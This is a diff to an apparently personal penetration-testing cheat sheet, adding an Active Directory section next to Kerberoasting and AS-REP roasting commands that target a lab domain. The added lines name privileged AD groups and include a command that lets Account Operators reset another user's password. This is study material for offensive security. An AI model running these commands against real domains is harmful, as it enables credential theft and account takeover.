@@ -50,6 +50,7 @@
   - [Local File Inclusion](#local-file-inclusion)
   - [PHP File Upload Bypass](#php-file-upload-bypass)
 - [SMB](#smb)
+- [Active Directory](#active-directory)
 - [Windows Privilege Escalation](#windows-privilege-escalation)
   - [Manual Enumeration](#manual-enumeration)
   - [Service Binary Hijacking](#service-binary-hijacking)
@@ -1012,9 +1013,27 @@ GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -ou
 
 # Kerberoast(requires valid credentials) 13100
 sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+```
+
+# Active Directory
+## Important Security Groups And Exploit
+**Backup Operators**
+```bash
 
 
 ```
+
+**Account Operators**
+```bash
+# Users in this group can create or modify other accounts in the domain
+Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
+```
+
+**Server Operators**
+```bash
+Users can administer Domain Controllers. They cannot change any administrative group memberships.
+```
+
 
 
 # Windows Privilege Escalation
